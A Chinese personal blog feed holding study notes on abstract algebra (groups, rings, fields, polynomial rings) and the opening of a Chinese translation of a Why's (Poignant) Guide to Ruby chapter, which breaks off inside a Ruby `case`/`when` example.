&lt;p&gt;呃, 本来想试试和之前的笔记和在一起, 但是还是分开比较好, 
因为抽象一点的知识感觉很有意思.&lt;/p&gt;

&lt;h2 id=&quot;群-环-域&quot;&gt;群, 环, 域&lt;/h2&gt;
&lt;h3 id=&quot;结构&quot;&gt;结构&lt;/h3&gt;
&lt;p&gt;二元运算
\(\tau : X \times X \rightarrow X, \tau (a, b) =: a \tau b\)&lt;/p&gt;

&lt;p&gt;有了二元运算就构成了&lt;strong&gt;代数结构&lt;/strong&gt;. 
即二元运算$\tau$定义了$X$上的代数结构$(X, \tau)$.&lt;/p&gt;

&lt;p&gt;对于&lt;strong&gt;结合的代数结构&lt;/strong&gt;, 称为&lt;strong&gt;半群&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;对存在&lt;strong&gt;逆元&lt;/strong&gt;和&lt;strong&gt;单位元&lt;/strong&gt;的半群, 形成&lt;strong&gt;群&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;存在$a^m = e$的群为&lt;strong&gt;循环群&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;对&lt;strong&gt;加法Abel群&lt;/strong&gt;和&lt;strong&gt;乘法半群&lt;/strong&gt;且满足&lt;strong&gt;乘法对加法的分配律&lt;/strong&gt;的, 形成&lt;strong&gt;环&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;无零因子&lt;/strong&gt;的&lt;strong&gt;交换环&lt;/strong&gt;称为&lt;strong&gt;整环&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;有&lt;strong&gt;非零单位元&lt;/strong&gt;且&lt;strong&gt;非零元可逆&lt;/strong&gt;的&lt;strong&gt;环&lt;/strong&gt;为&lt;strong&gt;除环&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;除环&lt;/strong&gt;中的&lt;strong&gt;乘法群交换&lt;/strong&gt;, 为&lt;strong&gt;域&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;代数结构&quot;&gt;代数结构&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;结合&lt;/strong&gt;: $(a \star b) \star c = a \star (b \star c)$&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;交换&lt;/strong&gt;: $a \star b = b \star a$ &lt;br /&gt;
是否交换可以通过看乘法表是否关于对角线对称来得到.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;单位(幺元)&lt;/strong&gt;: $e \star a = a = a \star e$&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;如何判断一个二元运算的好坏: 就是判断二元运算形成的代数结构更好&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;元素表和乘法表.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$(X, \cdot)$为一个代数结构, 那么$\forall x, y \in X, x \cdot y := x y$, 
于是可以定义$x_1 x_2 \cdots x_n = (((x_1 x_2)x_3)\cdots)x_n$
为&lt;strong&gt;左正规化乘积&lt;/strong&gt;, 同理, 右正规化乘积也可以类似的定义&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;广义结合律&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;半群&quot;&gt;半群&lt;/h4&gt;
&lt;p&gt;对于&lt;strong&gt;结合的&lt;/strong&gt;的代数结构, 就形成一个半群.&lt;/p&gt;

&lt;h4 id=&quot;幺半群&quot;&gt;幺半群&lt;/h4&gt;
&lt;p&gt;有幺元的半群叫&lt;strong&gt;幺半群,&lt;/strong&gt; 交换的半群教交换半群.&lt;/p&gt;

&lt;p&gt;在幺半群中, 幺元存在则必唯一.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;幺半群的例子: $\mathbb{N}, \mathbb{N}_0$   &lt;br /&gt;
然后有$(\mathbb{N}, +)$是交换半群, $(\mathbb{N}_0, \times, 0)$就是交换幺半群&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;想要证明子半群的话, 就证明&lt;strong&gt;包含单位元&lt;/strong&gt;就好.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$(m\mathbb{Z}, +, 0) \subset (\mathbb{Z}, +, 0)$是一个子幺半群&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;群&quot;&gt;群&lt;/h4&gt;
&lt;p&gt;群就是在幺半群的基础上有逆元的代数结构.&lt;/p&gt;

&lt;p&gt;一般线性群, 特殊线性群的两个例子.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
\[SL_n(\mathbb{R}) := \{A \in M_n(\mathbb{R}): det A = 1\}\]
  &lt;/li&gt;
  &lt;li&gt;
\[GL_n(\mathbb{Q}) := \{A \in M_n(\mathbb{Q}): det A \neq 1\]
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;想要找群, 一般可以在幺半群中找, 而&lt;strong&gt;子群&lt;/strong&gt;只要$a b^{-1} \in G$就好了.&lt;/p&gt;

&lt;p&gt;假如是一个&lt;strong&gt;交换群&lt;/strong&gt;的话, 那么群的乘法表(凯莱表)是关于&lt;strong&gt;对角线对称&lt;/strong&gt;的.&lt;/p&gt;

&lt;p&gt;关于群之间的子群包含关系可以画出&lt;strong&gt;哈塞图&lt;/strong&gt;.&lt;/p&gt;

&lt;h5 id=&quot;循环群&quot;&gt;循环群&lt;/h5&gt;
&lt;p&gt;就只看乘法循环群: (加法的类似)&lt;/p&gt;

\[\langle a \rangle = \{ a^i : i \in \mathbb{Z} \}\]

&lt;p&gt;循环群中的元素个数要么&lt;strong&gt;有限&lt;/strong&gt;, 要么&lt;strong&gt;可数&lt;/strong&gt;. 并且$o(a)$为$a$的阶数, 
并且这个阶数的定义就是$a^{o(a)} = e$的最小次数.&lt;/p&gt;

&lt;p&gt;若存在$m \neq n$使得$a^m = a^n$, 那么这个映射不是单射, 则$a$为有限阶元.&lt;/p&gt;

\[\mathrm{card} \langle a \rangle = o(a)\]

&lt;p&gt;群的&lt;strong&gt;阶&lt;/strong&gt;: 满足$a^n = e$的最小$n$.&lt;/p&gt;

&lt;h4 id=&quot;环&quot;&gt;环&lt;/h4&gt;
&lt;p&gt;子环只要$x - y, x y^{-1} \in R$即可.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;环中有&lt;strong&gt;零元&lt;/strong&gt; $a \boldsymbol{0} = \boldsymbol{0} = \boldsymbol{0} a$&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;广义分配律&lt;/strong&gt; 
\((\sum_i^m a_i)(\sum_j^n b_j) = \sum_i^m\sum_j^n a_i b_j\)&lt;/li&gt;
  &lt;li&gt;环是$\mathbb{Z}$代数, 即$(n a) b = n (a b) = a (n b)$ &lt;br /&gt;
(注: 因为没有除法)&lt;/li&gt;
  &lt;li&gt;若$R$为交换环, 则牛顿二项式公式仍成立&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;剩余类环&quot;&gt;剩余类环&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;理想&lt;/strong&gt;($I$为$R$的理想):&lt;/p&gt;

\[I \subset R, (I, +) \mathrm{is\ Group}, \forall x \in I, a \in R, a x,x a\in I\]

&lt;p&gt;理想一定是子环.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;剩余类环&lt;/strong&gt;&lt;/p&gt;

\[\mathbb{S} / \sim = \{\overline{x} : x \in S\}\]

&lt;p&gt;对于同余的等价关系:&lt;/p&gt;

\[\mathbb{Z}_m = \{ \overline{n} \} = \{ \overline{0}, \overline{1}, \cdots, \overline{n-1}\}\]

&lt;blockquote&gt;
  &lt;p&gt;$\mathbb{R}[x]/(1+x^2) \simeq \mathbb{C}, \overline{x} = i$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;整环&quot;&gt;整环&lt;/h5&gt;
&lt;blockquote&gt;
  &lt;p&gt;注: 区别整数环和整环  &lt;br /&gt;
整数环只是一个有单位元的交换环&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;零因子&lt;/strong&gt;: $a, b \in R^{\star}, a b = 0$, 分别为左右零因子.&lt;/p&gt;

&lt;p&gt;在没有零因子的环中, 左右消去律成立.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;注: 证明类似结论的时候, 建议是做差证明, 直接消去的话有些无理.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;对于&lt;strong&gt;没有零因子&lt;/strong&gt;的&lt;strong&gt;交换环&lt;/strong&gt;, 称为&lt;strong&gt;整环&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$\mathbb{Z}_p, \mathbb{Z}, \mathbb{Q}, \mathbb{R}, \mathbb{Q}$都是整环&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;唯一分解整环&lt;/p&gt;

&lt;h5 id=&quot;除环&quot;&gt;除环&lt;/h5&gt;
&lt;p&gt;有非零单位元的环$D$中的所有非零元都可逆, 则构成&lt;strong&gt;除环&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;简单理解: 除环 = 加法交换群 + 乘法群&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;域&quot;&gt;域&lt;/h4&gt;
&lt;p&gt;在除环的基础上有交换性.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;简单理解: 域 = 加法交换群 + 乘法交换群, 满足两个结合律&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;任意多个子域的交还是子域&lt;/p&gt;

&lt;p&gt;扩域&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;素域&lt;/strong&gt;: &lt;strong&gt;没有平凡的子域&lt;/strong&gt;的域&lt;/p&gt;

&lt;p&gt;剩余类环没有非平凡的子域&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$\mathbb{Q}$是素域, $\mathbb{Z}_p$也是素域&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在同构的概念下, 素域只有有理数域和剩余类域&lt;/p&gt;

&lt;h3 id=&quot;同态&quot;&gt;同态&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;保持运算&lt;/strong&gt;的映射就是群同态.&lt;/p&gt;

&lt;p&gt;和映射的单射, 满射, 还有双射类比, 有&lt;strong&gt;单同态&lt;/strong&gt;, &lt;strong&gt;满同态&lt;/strong&gt;, &lt;strong&gt;同构&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;自己到自己的映射, 就是&lt;strong&gt;自同态&lt;/strong&gt;, 比如自同构.&lt;/p&gt;

&lt;p&gt;并且自同构的集合是个&lt;strong&gt;自同构群&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;群同态, 环同态保持&lt;strong&gt;单位元&lt;/strong&gt;, &lt;strong&gt;逆元&lt;/strong&gt;, &lt;strong&gt;零元&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;群同态的复合还是群同态&lt;/li&gt;
  &lt;li&gt;任意同阶循环群同构&lt;/li&gt;
  &lt;li&gt;单同态$\Leftrightarrow Ker f = {e}$&lt;/li&gt;
  &lt;li&gt;满同态$\Leftrightarrow Im f = S’$&lt;/li&gt;
  &lt;li&gt;$Ker f \leq G$, $Im f \leq G’$&lt;/li&gt;
  &lt;li&gt;环同态第一基本定理: $R / Ker f \simeq Im f$&lt;/li&gt;
  &lt;li&gt;单同态可以限制为同构&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;复数和多项式&quot;&gt;复数和多项式&lt;/h2&gt;
&lt;h3 id=&quot;复数域&quot;&gt;复数域&lt;/h3&gt;
&lt;p&gt;通过引入辅助域&lt;/p&gt;

\[F:=\left\{\left(\begin{array}{ll}a &amp;amp; b \\ -b &amp;amp; a\end{array}\right) : a, b \in \mathbb{R} \right\}\]

&lt;p&gt;然后让${a E: a \in \mathbb{R}}$和$\mathbb{R}$等同, 
记\(I = \left(\begin{array}{ll}0 &amp;amp; 1 \\ -1 &amp;amp; 0\end{array}\right)\), 
于是就可以记$F={a + b I}$.&lt;/p&gt;

&lt;p&gt;这样的辅助域和复平面的点有一个双射, 
于是就可以利用这个得到一个自然的复数域的定义.&lt;/p&gt;

&lt;h4 id=&quot;复数的运算&quot;&gt;复数的运算&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;共轭: $i \rightarrow -i$&lt;/li&gt;
  &lt;li&gt;乘方和开方: 蒂莫夫公式或者极坐标
    &lt;ul&gt;
      &lt;li&gt;单位根&lt;/li&gt;
      &lt;li&gt;本原单位根&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;范数$N(z)=z \overline{z}$&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;多项式环&quot;&gt;多项式环&lt;/h3&gt;
&lt;h4 id=&quot;单变元多项式环&quot;&gt;单变元多项式环&lt;/h4&gt;
&lt;p&gt;设$A$为有单位元的交换环, 
令\(B = \{f=(f_0, f_1, f_2, \cdots) : f_i \in A 只有有限个非零\}\). 
于是$B$关于加法和多项式乘法做成一个有单位元的交换环. 
将$X=(0,1,0,0,\cdots)$称为&lt;strong&gt;变元&lt;/strong&gt;或&lt;strong&gt;未定元&lt;/strong&gt;. 
于是$f = \sum_{i=0}^{\infty} f_i X^i$, 并且表达式唯一. 
于是环$B=:A[X]$为$A$上变元$X$的&lt;strong&gt;多项式环&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;一坨概念:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;多项式: $f$&lt;/li&gt;
  &lt;li&gt;系数: $f_i$&lt;/li&gt;
  &lt;li&gt;零多项式: $\forall i, f_i = 0 \Rightarrow f = 0$&lt;/li&gt;
  &lt;li&gt;首项系数: $f_i \neq 0$的最大的$i$对应的系数&lt;/li&gt;
  &lt;li&gt;首一多项式: 首项系数为$1$的多项式&lt;/li&gt;
  &lt;li&gt;次数: \(\deg f = max\{i : f_i \neq 0\}\)
    &lt;ul&gt;
      &lt;li&gt;$\deg 0 := - \infty$&lt;/li&gt;
      &lt;li&gt;$\deg (f + g) \leq max{\deg f, \deg g}$ &lt;br /&gt;
(整环时: $\deg (f + g) = max{\deg f, \deg g}$)&lt;/li&gt;
      &lt;li&gt;$\deg (f g) \leq \deg f + \deg g$ &lt;br /&gt;
(整环时: $\deg (f g) = \deg f + \deg g$)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一些性质:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;若$A$是整环, 则$A[X]$也是整环.
    &lt;blockquote&gt;
      &lt;p&gt;证明方法就是证明$A[X]$没有零因子, 于是就是反证法, 利用$\deg$的性质来就好.&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;多项式环的&lt;strong&gt;范性&lt;/strong&gt; &lt;br /&gt;
设$A$为有单位元的交换环, 则对任意有单位元的交换环$B$, 
对于任意的环同态$\varphi: A \rightarrow B$, 对于任意的$t \in B$, 
都存在一个唯一的环同态$\varphi_t: A[X] \rightarrow B$, 
使得$\varphi_t(a) = \varphi(a), \varphi_t(X)=t$.  &lt;br /&gt;
$\sim: A[X] \rightarrow A^A, f(X) \mapsto f(x)$&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;多变元多项式环&quot;&gt;多变元多项式环&lt;/h4&gt;
&lt;p&gt;\(A[X_1, \cdots, X_2] := \left\{\begin{array}{ll} A[X_1] &amp;amp; n = 1 \\ A[X_1, \cdots, X_{n-1}] &amp;amp; n \geq 2 \end{array}\right.\)&lt;/p&gt;

&lt;p&gt;里面的元素可以写成$f=\sum_{(i)} a_{(i)} X^{(i)}$&lt;/p&gt;

&lt;p&gt;一些定义:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;次数: \(\deg_k f := max\{ i_k : a_{}\}\)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;显然, 整环的性质保存&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;带余除法&quot;&gt;带余除法&lt;/h4&gt;

&lt;h2 id=&quot;练习&quot;&gt;练习&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;$\mathbb{R}[X]/(X^2 + 1) \simeq \mathbb{C}$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;关于&lt;strong&gt;商集&lt;/strong&gt;, 就是$R/I$类型的东西, 可以直接把$I$中的元素当作是零元. 
这样的$R$就会变成一个新的集合. 举个例子: 
$\mathrm{Z}/n \mathbb{Z} = \mathbb{Z}_n$.&lt;/p&gt;

&lt;p&gt;想要证明两个东西是相等的:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;集合: 
\(A \subseteq B, B \subseteq A \Rightarrow A = B\)&lt;/li&gt;
  &lt;li&gt;数: 
\(a|b, b|a \Rightarrow a = b\)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;想要判断一个表达式是否是既约式:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;\(X^5 - 25 \in \mathbb{Q}[X]\)    &lt;br /&gt;
嗯, 这种东西可以试试这个结论: 对于方程$a_n x^n + \cdots + a_1 x + a_0 = 0$, 
假如有有理根$\frac{q}{p}$, 那么$q|a_0$, $p|a_n$. 于是就可以去尝试$a_0$的因子,
发现$\pm 1, \pm 25, \pm 5$都不是解, 所以就没有有理根. 在复数域里面分解, 
最后就可以得到结果和系数为有理数矛盾.&lt;/li&gt;
  &lt;li&gt;$a_n x^n + \cdots + a_1 x + a_0 = 0$假如是在有理数域里面的既约式, 
就可以用这个: 假如有一个素数$p$, $p \nmid a_n, p \mid a_i, (i = 0, \cdots, n - 1), p^2 \nmid a_0$, 
这样就可以得到结果. (注: 不一定在$\mathbb{Z}$也使用)&lt;/li&gt;
  &lt;li&gt;或者可以这样: $X \mapsto X + 1$之类的做法, 通过变化来得到满足上面的结论的东西&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;要判断是否是一个&lt;strong&gt;代数元&lt;/strong&gt;: 
首先, 代数元是对加减乘除运算封闭的元素, 也就是所有代数元构成一个域. 
并且假如一个元素是代数元, 有: $F(X) = F[X]$, 也就是$[F(X):F] &amp;lt; \infty$.&lt;/p&gt;

&lt;p&gt;有一个命题: $\sin \frac{q}{p} \pi \Rightarrow $是代数元, 
$\sin \frac{q}{p} \Rightarrow $是超越元.&lt;/p&gt;

&lt;p&gt;$R^X := { 所有X到R的映射 }$对于这样的东西, 可以这样理解, 
$A^{\mathbb{N}_0} = {(a_0, \cdots) : a_i \in A}$&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;域扩展: $F(\alpha) = { \frac{\sum b_i \alpha^i}{\sum c_j \alpha^j}}$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;单位: $N(\alpha) = 1$   &lt;br /&gt;
范数: $N(a + b \sqrt{d}) := (a + b \sqrt{d})(a - b \sqrt{d})$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(注: 有一个定理, 假如$d&amp;gt;0, d \equiv 3 (mod 4) \Rightarrow \mathbb{Z}[\sqrt{d}]是无限群, \mathbb{Z}[\sqrt{-d}]是有限群$)&lt;/p&gt;

&lt;p&gt;对子群, 子环, 子域的验证: 
$a b^{-1} \in G$表示子群, 子环就加上验证一个加法的群就好.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$F$是域, 则$F^{\star}$的有限子群为循环群&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;$\mid G\mid$是一个偶数群, 那么$G$一定有二阶元&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;反证法: 假设存在一个$x \neq 0, x^2 \neq e, x \neq x^{-1} \Rightarrow \mid G { e } \mid$矛盾&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;对环同态证明不存在: $\mathbb{Q}(\sqrt{3}) \rightarrow \mathbb{Q}$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;反证法: 假如有环同态, 就会保持单位元$f(1) \mapsto 1 \Rightarrow f(\frac{p}{q}) = \frac{p}{q}$, 
那么就会说明有理数会映射到了有理数部分, 那么还玩个啥, 说明逆映射就不满射了, 
所以就不能是环同态了.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;一个思想: 可以将讨论的范围通过扩大范围来得到一个更好的范围来讨论问题:  &lt;br /&gt;
$\mathbb{R}[X]$的多项式的素多项式只有一次式和二次式&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;简单的思想: $\mathbb{R}[X]$上的多项式在$\mathbb{C}[X]$上可以分解为一次式, 
然后就可以得到了$(x - x_i)$的类似分解, 那么就是得到了一个好东西, 
因为复数分解成对, 会形成一个二次式, 假如是实数解的话就是一次式.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所有子群的交就是最小的子群&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;在$\mathbb{Z}_m$里的运算, 可以直接运算, 然后在直接取代表元就好了   &lt;br /&gt;
如$\frac{1}{3} \in \mathbb{Z}_5 = 2$, 
这样的做法就是直接$x = \frac{1}{3} \Rightarrow 3 x = 1 = 6$就好了&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;算$gcd(f, g)$的注意点: $gcd(f, g)$在多项式里面是首一多项式, 
在化简的时候要注意. (有一个注意: 在做长除法的时候, 记得把除数和余数标记了, 
省的忘了)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;初等矩阵&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
&lt;p&gt;就这样呗. 最后一门考试, 画上第一学期的句号.&lt;/p&gt;</content><author><name></name></author><category term="notes" /><summary type="html">线性代数 呃, 本来想试试和之前的笔记和在一起, 但是还是分开比较好, 因为抽象一点的知识感觉很有意思.</summary></entry><entry><title type="html">Why’s (poignant) Guide to Ruby(3)</title><link href="http://0.0.0.0:4000/ruby/why's_(poignant)_guide_to_ruby/them-what-make-the-rules-and-them-what-live-the-dream/" rel="alternate" type="text/html" title="Why’s (poignant) Guide to Ruby(3)" /><published>2022-01-05T08:03:15+00:00</published><updated>2022-01-05T08:03:15+00:00</updated><id>http://0.0.0.0:4000/ruby/why's_(poignant)_guide_to_ruby/them-what-make-the-rules-and-them-what-live-the-dream</id><content type="html" xml:base="http://0.0.0.0:4000/ruby/why's_(poignant)_guide_to_ruby/them-what-make-the-rules-and-them-what-live-the-dream/">&lt;h1 id=&quot;them-what-make-the-rules-and-them-what-live-the-dream&quot;&gt;Them What Make the Rules and Them What Live the Dream&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/chapter.poignant.guide-5.jpg&quot; alt=&quot;under the title&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/dr.cham-1.gif&quot; alt=&quot;through the space and time... in his bell jar... on a mission to find himself&quot; title=&quot;一个坐在玻璃瓶中穿越时空去寻找自我和真实的男人&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;正文前的叨叨&quot;&gt;正文前的叨叨&lt;/h2&gt;
&lt;p&gt;摊牌了, 我就是在乱翻译. 并且我之前其实也没有认真地读完, 
就是水了一遍代码, 故事都没看. 所以我现在挑着我之前不怎么会的地方, 
(因为我发现我现在的代码写出来和别的语言没什么大区别, 
不够优美, 所以, 我要改变! )
然后重新学习, 然后(尽可能地)认真翻译.&lt;/p&gt;

&lt;p&gt;假如你想看原文的话, 看&lt;a href=&quot;https://poignant.guide/book/chapter-5.html&quot;&gt;这&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;回到正文&quot;&gt;回到正文&lt;/h2&gt;
&lt;p&gt;说实话, 那些说Dr. Cham(Cham博士)是个疯子的鬼话我已经听腻了. 
没错, 他的行为无异于将自己活生生地埋入那个玻璃棺材; 
他电击他侄女的行为也是有目共睹; 
他也的确将那个快要报废的房子用炸弹轰上了天. 
但是这些可都是在他的深思熟虑下的仔细操作
(并且我相信, 在每一次这样的事情中, 他都采取了正确的措施. )&lt;/p&gt;

&lt;p&gt;随大流吧, 孩子, 但是我可以肯定, 在你的内心深处, 
总还是有一丝丝地对他的难以抑制地敬仰 – 
毕竟曾经他花了很多时间教会了你如何定义一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;的类, 
甚至还教会了你如何&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mixin&lt;/code&gt;模块. 所以有可能的话, 
我希望我们可以在这章结束的时候回顾一下博士的灰蓝色的一生, 
然后不要再叫他”疯子”了.&lt;/p&gt;

&lt;p&gt;但是假如你执意要叫他”疯子”, 那我就只好冲到铁轨上, 
看着火车呼啸而过, 碾碎一串又一串的闪亮的灯带, 碎片撒落一地, 
场面一片混乱. 然后你就只好骂骂咧咧地去清理这些碎渣了.&lt;/p&gt;

&lt;p&gt;好的, 我们继续.&lt;/p&gt;

&lt;h2 id=&quot;1-this-ones-for-the-disenfranchised&quot;&gt;1. This One’s For the Disenfranchised&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;这家伙出局&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/elderly-1.gif&quot; alt=&quot;some people still can't get past what he did&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果你问我Dr. Cham一生中的任何一个时刻, 
我可以为你大致地回忆起那段时间里Dr. Cham的事情. 
并且我还要用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;里面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;的方法来做到这件事, 
所以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;会将这段代码变成一段独立的代码, 
虽然是一块和其他代码孤立起来的代码, 但是当程序喊他的时候, 
它又会被调用并执行.&lt;/p&gt;

&lt;p&gt;(这一段的翻译不是很好, 给出原文: )&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;so it’s an independent piece, 
an isolated chunk of code 
which can be hooked up 
to the voice of a robotic volcano, 
when such a thing becomes the apex of 
authoritative voice talents.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(大概的意思是: 当控制着程序世界的至高之声喊到它的名字的时候, 
哪怕这不过是一块独立的代码, 它也会被机器火山的熔岩勾连起来, 
最后程序的一部分运行. )&lt;/p&gt;

&lt;p&gt;好的, 我希望你可以注意一下关键词&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;when&lt;/code&gt;. 
你应该见过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ranges&lt;/code&gt;了, 
(对不起, 没翻译第三章:p, 简单科普一下, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Range&lt;/code&gt;顾名思义就是区间的意思, 大概理解一下就好. )
在这里的是一个闭区间&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1895..1913&lt;/code&gt;
(就是包含开头的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1895&lt;/code&gt;和结尾的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1913&lt;/code&gt;的东西), 假如没印象了的话, 
请返回&lt;a href=&quot;https://poignant.guide/book/chapter-3.html&quot;&gt;第三章&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;然后在某些行的末尾的斜杠&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;的作用是告诉字符串
把我们的输入中的回车键忽略掉, 
这样就可以告诉&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;这是一个很长很长的字符串, 
长到甚至有好几行.&lt;/p&gt;

&lt;p&gt;好的, 注意看着&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;case&lt;/code&gt;还有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;when&lt;/code&gt;哦.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dr_chams_timeline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;year&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;year&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1894&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Born.&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 出生&lt;/span&gt;
